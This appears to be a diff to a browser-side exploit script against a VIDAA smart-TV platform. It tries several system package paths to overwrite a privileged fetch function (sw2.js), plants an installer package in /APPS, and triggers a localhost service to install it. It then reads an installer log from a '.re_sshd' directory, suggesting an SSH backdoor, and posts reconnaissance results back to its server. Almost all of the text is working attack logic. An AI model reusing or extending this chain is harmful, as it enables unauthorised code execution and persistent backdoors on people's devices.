@@ -8,8 +8,19 @@
 var O = document.getElementById('o');
 function log(m){ O.textContent += "\n" + m; return m; }
 var BASE = "http://" + location.host + "/pub/";
-var FUNC_URL = "https://localhost:9888/function/system/fetch/sw2";
-var FN_PATH = "/APPS/pkgs/tv.vidaa.jsservice.system/CHA/functions/fetch/sw2.js";
+/* 75UR9S / 09.60W: the fetch FaaS function lives in the BASIC package
+   (tv.vidaa.jsservice.basic/CHA/functions/fetch/), not the system one.
+   Route type "basic" -> ROOT_BASIC_JS. Try candidates in order;
+   fetchFile requires the parent dir to exist (ENOENT otherwise). */
+var FN_CANDIDATES = [
+  "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",
+  "/APPS/pkgs/tv.vidaa.jsservice.system/current/functions/fetch/sw2.js",
+  "/APPS/pkgs/tv.vidaa.jsservice.system/CHA/functions/fetch/sw2.js"
+];
+var TRIGGER_URLS = [
+  "https://localhost:9888/function/basic/fetch/sw2",
+  "https://localhost:9888/function/system/fetch/sw2"
+];
 
 function post(t){ try{ var x=new XMLHttpRequest(); x.open("POST","/recon",false);
   x.setRequestHeader("Content-Type","text/plain"); x.send(t); }catch(e){} }
@@ -41,22 +52,37 @@ function writeFile(name, target, mode){
 
 function trigger(){
   return new Promise(function(resolve){
-    try{
-      var x = new XMLHttpRequest();
-      x.open("POST", FUNC_URL, false);
-      x.setRequestHeader("identifier", "");
-      x.send(JSON.stringify({list:["90:82:90;/APPS/installer.ipk;re.installer;"]}));
-      resolve("trigger -> " + String(x.responseText||"").slice(0,300));
-    }catch(e){ resolve("trigger EXC " + e.name + ": " + e.message); }
+    var results = [];
+    for (var i = 0; i < TRIGGER_URLS.length; i++){
+      try{
+        var x = new XMLHttpRequest();
+        x.open("POST", TRIGGER_URLS[i], false);
+        x.setRequestHeader("identifier", "");
+        x.send(JSON.stringify({list:["90:83:90;re.installer","91:82:91;/APPS/installer.ipk;re.installer;"]}));
+        results.push(TRIGGER_URLS[i].replace("https://localhost:9888","") + " -> " + String(x.responseText||"").slice(0,200));
+        if (String(x.responseText||"").indexOf("got error") === -1 && String(x.responseText||"").length > 0) break;
+      }catch(e){ results.push(TRIGGER_URLS[i].replace("https://localhost:9888","") + " EXC " + e.name + ": " + e.message); }
+    }
+    resolve("trigger -> " + results.join(" | "));
   });
 }
 
 setTimeout(async function(){
   var out = [];
   out.push(await startFetcher());
-  out.push(await writeFile("sw2.js", FN_PATH, 420));
+  var sw2ok = false;
+  for (var i = 0; i < FN_CANDIDATES.length && !sw2ok; i++) {
+    var r = await writeFile("sw2.js", FN_CANDIDATES[i], 420);
+    out.push(r + "  [" + FN_CANDIDATES[i] + "]");
+    sw2ok = r.indexOf("true") !== -1;
+  }
   out.push(await writeFile("installer.ipk", "/APPS/installer.ipk", 420));
-  out.push(await trigger());
+  if (sw2ok) {
+    out.push(await trigger());
+  } else {
+    out.push("trigger SKIPPED (sw2.js not placed)");
+  }
+  await new Promise(function(res){ setTimeout(res, 2500); });
   try{
     var p = vowOS.service.syncExecute("hiutils", {api:"fileRead", args:{mode:6, path:".re_sshd/installer_log.txt"}});
     out.push("log=" + (p.ret ? p.msg.slice(0,400) : "ERR"));
